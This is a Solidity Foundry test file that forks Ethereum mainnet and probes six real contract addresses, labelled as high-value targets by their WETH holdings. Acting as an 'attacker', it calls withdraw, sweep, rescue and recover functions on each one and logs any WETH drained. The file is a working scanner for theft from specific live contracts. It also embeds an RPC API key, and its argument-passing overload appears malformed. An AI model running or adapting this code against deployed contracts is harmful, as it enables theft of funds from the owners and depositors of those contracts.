// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

contract TokenDrainTest is Test {
    address attacker;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    // High value targets with significant token holdings
    address constant TARGET1 = 0x8392F6669292fA56123F71949B52d883aE57e225; // 23.8 WETH
    address constant TARGET2 = 0xC8c1B41713761281a520b7ad81544197bc85a4Ce; // 91.6 WETH
    address constant TARGET3 = 0x8D90113A1e286a5aB3e496fbD1853F265e5913c6; // 139.5 WETH
    address constant TARGET4 = 0x5Dc76fD132354be5567ad617fD1fE8fB79421D82; // 47 WETH
    address constant TARGET5 = 0x587A07cE5c265A38Dd6d42def1566BA73eeb06F5; // 145.7 WETH
    address constant TARGET6 = 0xE5BFAB544ecA83849c53464F85B7164375Bdaac1; // 124.6 WETH

    function setUp() public {
        vm.createSelectFork("https://eth-mainnet.g.alchemy.com/v2/pLXdY7rYRY10SH_UTLBGH");
        attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);
    }

    function test_analyzeTarget1() public {
        _analyzeContract(TARGET1, "23.8 WETH contract");
    }

    function test_analyzeTarget2() public {
        _analyzeContract(TARGET2, "91.6 WETH contract");
    }

    function test_analyzeTarget3() public {
        _analyzeContract(TARGET3, "139.5 WETH contract");
    }

    function test_analyzeTarget4() public {
        _analyzeContract(TARGET4, "47 WETH contract");
    }

    function test_analyzeTarget5() public {
        _analyzeContract(TARGET5, "145.7 WETH contract");
    }

    function test_analyzeTarget6() public {
        _analyzeContract(TARGET6, "124.6 WETH contract");
    }

    function _analyzeContract(address target, string memory name) internal {
        console.log("=== Analyzing:", name, "===");
        console.log("Address:", target);
        console.log("ETH balance:", target.balance / 1e18);
        console.log("WETH balance:", IERC20(WETH).balanceOf(target) / 1e18);
        console.log("Code size:", target.code.length);

        // Check for proxy patterns
        bytes32 implSlot = bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
        bytes32 impl = vm.load(target, implSlot);
        if (impl != bytes32(0)) {
            console.log("EIP-1967 Implementation:", address(uint160(uint256(impl))));
        }

        // Check slot 0 for owner/implementation
        bytes32 slot0 = vm.load(target, bytes32(uint256(0)));
        console.log("Slot 0:");
        console.logBytes32(slot0);

        // Try common functions
        _tryFunction(target, "owner()");
        _tryFunction(target, "admin()");
        _tryFunction(target, "governance()");
        _tryFunction(target, "controller()");
        _tryFunction(target, "pendingOwner()");

        // Try withdraw functions as attacker
        uint256 wethBefore = IERC20(WETH).balanceOf(attacker);

        vm.startPrank(attacker);
        _tryCall(target, "withdraw()");
        _tryCall(target, "withdrawAll()");
        _tryCall(target, "emergencyWithdraw()");
        _tryCall(target, "claim()");
        _tryCall(target, "exit()");
        _tryCall(target, "sweep(address)", abi.encode(WETH));
        _tryCall(target, "sweepToken(address)", abi.encode(WETH));
        _tryCall(target, "rescueTokens(address,uint256)", abi.encode(WETH, IERC20(WETH).balanceOf(target)));
        _tryCall(target, "recoverERC20(address,uint256)", abi.encode(WETH, IERC20(WETH).balanceOf(target)));
        _tryCall(target, "claimComp(address)", abi.encode(attacker));
        _tryCall(target, "getReward()");
        _tryCall(target, "harvest()");
        vm.stopPrank();

        uint256 wethAfter = IERC20(WETH).balanceOf(attacker);
        if (wethAfter > wethBefore) {
            console.log("!!! WETH DRAINED:", (wethAfter - wethBefore) / 1e18);
        }

        console.log("");
    }

    function _tryFunction(address target, string memory sig) internal view {
        (bool s, bytes memory d) = target.staticcall(abi.encodeWithSignature(sig));
        if (s && d.length >= 32) {
            uint256 val = abi.decode(d, (uint256));
            if (val != 0 && val < type(uint160).max) {
                console.log(sig, ":", address(uint160(val)));
            }
        }
    }

    function _tryCall(address target, string memory sig) internal {
        target.call(abi.encodeWithSignature(sig));
    }

    function _tryCall(address target, string memory sig, bytes memory data) internal {
        target.call(abi.encodeWithSignature(sig, data));
    }
}
